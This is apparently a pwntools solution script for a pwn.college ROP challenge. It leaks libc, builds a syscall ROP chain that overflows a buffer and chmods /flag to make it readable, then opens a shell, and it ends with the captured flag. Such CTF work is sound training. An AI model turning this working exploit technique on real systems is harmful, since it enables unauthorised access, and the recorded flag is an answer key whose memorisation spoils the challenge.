from pwn import *

elf = context.binary = ELF("./babyrop_level7.0")
libc = ELF("./libc.so.6", checksec=False)
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

io = s.process("/challenge/babyrop_level7.0")

io.recvuntil(b'libc is: ')
leak = int(io.recvline().strip()[:-1], 16)
base = libc.address = leak - libc.sym['system']
info("Leak base Libc: " + hex(base))

rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
pos = elf.bss() + 0x100


chain =  b'a'*0x58
chain += p64(pop_rax) + p64(0)    + p64(pop_rdi) + p64(0)   + p64(pop_rsi) + p64(pos) + p64(pop_rdx) + p64(0x100) + p64(syscall)
chain += p64(pop_rax) + p64(0x5a) + p64(pop_rdi) + p64(pos) + p64(pop_rsi) + p64(7)   + p64(syscall)
io.send(chain)
io.send(b'/flag\x00')
io.close()

sh = s.shell(b'/bin/sh')
sh.interactive()
# Flag: pwn.college{sYfx1Ncqw4C8ZHaJ4s8dJ6T8Cuh.01M1MDLxIjNyEzW}